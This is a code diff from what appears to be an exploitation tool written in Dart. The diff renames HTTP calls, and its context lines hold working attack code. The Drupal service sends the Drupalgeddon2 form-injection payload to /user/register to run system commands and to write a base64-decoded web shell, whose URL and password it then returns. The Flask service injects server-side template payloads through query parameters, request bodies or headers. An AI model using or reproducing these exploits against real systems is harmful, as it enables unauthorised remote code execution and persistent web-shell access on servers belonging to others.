@@ -36,13 +36,13 @@ class DrupalExpService {
           "php -r 'file_put_contents(\"$shellFile\", base64_decode(\"$shellB64\"));'";
       final payload =
           'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(phpCmd)}';
-      await _httpClient.post(
+      await _httpClient.postOrThrow(
         '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: payload,
       );
       final checkUrl = '$_base/$shellFile';
-      final check = await _httpClient.get(checkUrl);
+      final check = await _httpClient.getOrThrow(checkUrl);
       if (check.statusCode == 200) return '$checkUrl Pass:$password';
       return null;
     } catch (_) {
@@ -86,7 +86,7 @@ class DrupalExpService {
     try {
       const payload =
           'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
-      final res = await _httpClient.post(
+      final res = await _httpClient.postOrThrow(
         '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: payload,
@@ -119,7 +119,7 @@ class DrupalExpService {
       final safeCmd = _buildSafeCommand(cmd);
       final payload =
           'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(safeCmd)}';
-      final res = await _httpClient.post(
+      final res = await _httpClient.postOrThrow(
         '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: payload,
@@ -176,7 +176,7 @@ class FlaskSstiExpService {
 
     switch (injectMode) {
       case SstiInjectMode.get:
-        return _httpClient.get(
+        return _httpClient.getOrThrow(
           Uri.parse('$_base/?$paramName=${Uri.encodeComponent(payload)}').toString(),
           headers: headers,
         );
@@ -192,7 +192,7 @@ class FlaskSstiExpService {
                   ? 'application/json'
                   : 'application/x-www-form-urlencoded';
         }
-        return _httpClient.post(
+        return _httpClient.postOrThrow(
           baseUri.toString(),
           headers: headers,
           body: body,
@@ -203,7 +203,7 @@ class FlaskSstiExpService {
         for (final key in headers.keys.toList()) {
           headers[key] = headers[key]!.replaceAll('{{INJECT}}', payload);
         }
-        return _httpClient.get(
+        return _httpClient.getOrThrow(
           baseUri.toString(),
           headers: headers,
         );
